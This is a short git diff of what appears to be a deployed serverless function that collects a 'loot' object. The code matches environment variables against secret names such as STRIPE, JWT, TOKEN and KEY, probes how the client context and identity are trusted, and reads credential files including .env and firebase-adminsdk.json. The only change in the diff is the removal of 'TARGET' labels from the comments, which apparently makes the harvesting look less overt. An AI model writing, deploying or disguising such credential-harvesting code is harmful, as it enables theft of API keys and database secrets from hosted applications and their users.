@@ -3,7 +3,7 @@ const fs = require('fs');
 exports.handler = async (event, context) => {
   const loot = {};
 
-  // --- TARGET 1: Deep Secret Search ---
+  // --- Deep Secret Search ---
   const criticalPatterns = [
     'STRIPE', 'SUPABASE', 'FIREBASE', 'JWT', 'PRIVATE', 'DATABASE', 'SECRET', 'KEY', 'TOKEN'
   ];
@@ -15,14 +15,14 @@ exports.handler = async (event, context) => {
     }
   });
 
-  // --- TARGET 2: Logic Flaw - ClientContext Trust ---
+  // --- Logic Flaw - ClientContext Trust ---
   loot.auth_check = {
     hasClientContext: !!context.clientContext,
     hasIdentity: !!context.identity,
     clientContextRaw: context.clientContext ? "PRESENT" : "MISSING"
   };
 
-  // --- TARGET 3: Filesystem Secret Scavenging ---
+  // --- Filesystem Secret Scavenging ---
   const filesToCrawl = ['./.env', './config.json', './supabase.json', './firebase-adminsdk.json'];
   loot.file_secrets = {};
   filesToCrawl.forEach(f => {
